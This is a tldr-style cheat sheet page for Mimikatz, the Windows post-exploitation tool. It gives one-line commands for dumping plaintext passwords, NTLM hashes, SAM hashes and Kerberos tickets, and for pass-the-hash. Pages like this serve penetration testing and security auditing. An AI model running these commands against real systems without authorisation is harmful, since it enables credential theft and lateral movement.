---
title: "Mimikatz - Extract Windows Credentials | Online Free DevTools by Hexmos"
name: mimikatz
path: "/freedevtools/tldr/windows/mimikatz/"
canonical: "https://hexmos.com/freedevtools/tldr/windows/mimikatz/"
description: "Extract Windows credentials with Mimikatz, a powerful post-exploitation tool. Dump passwords, hashes, and Kerberos tickets. Free online tool, no registration required."
category: windows
keywords:
- windows credential extraction
- mimikatz password dumper
- windows password recovery
- windows hash extraction
- kerberos ticket dump
- local sam database dump
- windows post exploitation
- credential theft windows
- windows security auditing
- windows privilege escalation
features:
- Dump plaintext passwords from memory
- Extract NTLM hashes from Windows
- Export Kerberos tickets to a file
- Manipulate user tokens for privilege escalation
- Dump local SAM database hashes
ogImage: "https://hexmos.com/freedevtools/site-banner.png"
twitterImage: "https://hexmos.com/freedevtools/site-banner.png"
---

# mimikatz

> Interact with Windows credentials, perform credential dumping, token manipulation, and more.
> Requires administrator privileges and typically runs on Windows.
> More information: <https://github.com/gentilkiwi/mimikatz>.

- Run mimikatz in interactive mode:

`mimikatz`

- Enable debug privileges (needed for most operations):

`mimikatz "privilege::debug"`

- List available logon sessions:

`mimikatz "sekurlsa::logonpasswords"`

- Dump plaintext passwords, NTLM hashes, and Kerberos tickets from memory:

`mimikatz "sekurlsa::logonpasswords"`

- Pass-the-Hash with a specific NTLM hash and launch a command:

`mimikatz "sekurlsa::pth /user:{{username}} /domain:{{domain}} /ntlm:{{hash}} /run:{{cmd}}"`

- Dump local SAM database hashes:

`mimikatz "lsadump::sam"`

- Extract Kerberos tickets and export to a file:

`mimikatz "kerberos::list /export"`

- Exit mimikatz:

`exit`
